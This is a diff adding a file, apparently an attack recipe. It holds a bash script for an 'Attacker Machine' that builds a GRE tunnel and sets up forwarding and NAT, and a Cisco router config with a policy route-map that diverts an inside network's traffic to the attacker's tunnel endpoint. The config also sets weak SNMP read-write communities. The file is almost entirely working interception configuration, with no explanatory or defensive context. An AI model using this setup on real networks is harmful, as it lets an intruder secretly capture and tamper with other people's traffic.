@@ -1,0 +1,50 @@
+Attacker Machine
+
+#!/bin/bash
+modprobe ip_gre
+iptunnel add mynet mode gre remote 192.168.99.227 local 192.168.98.63 ttl 255 
+ip addr add 172.16.0.3/24 dev mynet 
+route add -net 172.16.0.0 netmask 255.255.255.0 dev mynet 
+ifconfig mynet up 
+route add -net 10.200.0.0 netmask 255.255.255.0 gw 172.16.0.1
+echo 1 > /proc/sys/net/ipv4/ip_forward
+iptables --table nat --append POSTROUTING --out-interface eth3 -j MASQUERADE 
+iptables --append FORWARD --in-interface mynet -j ACCEPT
+
+Cisco Router Config
+
+route-map divert permit 10 
+ match ip address 102 
+ set ip next-hop 172.16.0.3
+!
+interface FastEthernet0/0
+ mac-address cc01.0720.0000
+ ip address 192.168.99.227 255.255.254.0
+ ip nat outside
+ duplex auto
+ speed auto
+!
+interface FastEthernet1/0
+ mac-address cc01.0720.0010
+ ip address 10.200.0.237 255.255.255.0
+ ip policy route-map divert
+ ip nat inside
+ duplex auto
+ speed auto
+!
+ip nat inside source list 102 interface FastEthernet0/0 overload
+ip classless
+ip route 0.0.0.0 0.0.0.0 192.168.99.1
+!
+access-list 1 permit 10.200.0.0 0.0.0.255
+access-list 102 permit ip 10.200.0.0 0.0.0.255 any
+!
+snmp-server community public RO
+snmp-server community private RW 1
+!
+interface Tunnel0 
+ ip address 172.16.0.1 255.255.255.0 
+ tunnel source FastEthernet0/0 
+ tunnel destination 192.168.98.63
+
+
